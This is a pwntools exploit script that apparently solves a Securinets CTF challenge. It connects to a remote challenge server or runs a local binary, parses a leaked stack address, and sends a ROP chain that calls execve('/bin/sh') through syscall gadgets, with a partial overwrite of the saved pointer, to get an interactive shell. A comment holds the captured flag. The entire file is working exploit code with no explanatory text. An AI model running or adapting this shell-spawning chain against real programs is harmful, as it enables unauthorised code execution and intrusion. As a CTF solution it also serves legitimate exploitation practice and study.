#!/usr/bin/python3

from pwn import *

exe = ELF('main_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                # b*0x00000000004011ed

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('pwn.ctf.securinets.tn', 5001)
else:
        p = process(exe.path)

GDB()
pop_rdi = 0x40114A 
pop_rax = 0x401152
pop_rsi = 0x40114C
pop_rdx = 0x40114E
syscall = 0x401150
stack = p.recvline().decode().split()
stack = int(stack[4], 16)
info("stack: " + hex(stack))
payload = flat(
        b'/bin/sh\0',
        pop_rax, 0x3b,
        pop_rdi, stack,
        pop_rdx, 0,
        pop_rsi, 0,
        syscall,
        
        ).ljust(128) + p64(stack) + p16(0xfe22)
s(payload)
p.interactive()
# Securinets{L0ve_is_Brute_F0rce1ble_to0}
